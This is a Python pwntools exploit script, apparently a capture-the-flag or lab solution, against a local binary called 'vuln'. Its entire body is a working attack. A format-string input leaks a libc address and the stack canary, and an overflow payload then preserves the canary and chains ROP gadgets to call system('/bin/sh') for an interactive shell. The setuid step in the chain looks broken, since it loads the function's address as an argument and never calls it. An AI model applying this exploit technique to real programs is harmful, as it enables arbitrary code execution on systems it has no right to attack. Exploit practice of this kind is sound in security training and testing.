#!/usr/bin/env python
from pwn import *

shift_pie = 0x0#0x56b0
shift_libc = 0x114A37
canary_offset = 24 # è l'offset dal SECONDO input, occhio!
ret_offset = 8
pop_rdi = 0x000000000002a3e5
ret = 0x0000000000029cd6

e = ELF('vuln')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
io = e.process()
 
io.sendline('%3$lx-%11$lx')
io.recvline()
leak = io.recvline()
libc.address = int(leak.strip().split(b'-')[0], 16) - shift_libc
canary = int(leak.strip().split(b'-')[1], 16)
 
log.info("Libc: %s" % hex(libc.address))
log.info("Canary: %s" % hex(canary))

# gdb.attach(io)

payload = flat(
        b"A"*canary_offset,
        canary, 
        b"B"*ret_offset,
        libc.address + pop_rdi,
        libc.sym['setuid'],
        libc.address + pop_rdi,
        next(libc.search(b'/bin/sh')),
        libc.address + ret,
        libc.sym['system'],
        endianness = 'little', word_size = 64, sign = False)
 
io.sendline(payload)
io.interactive()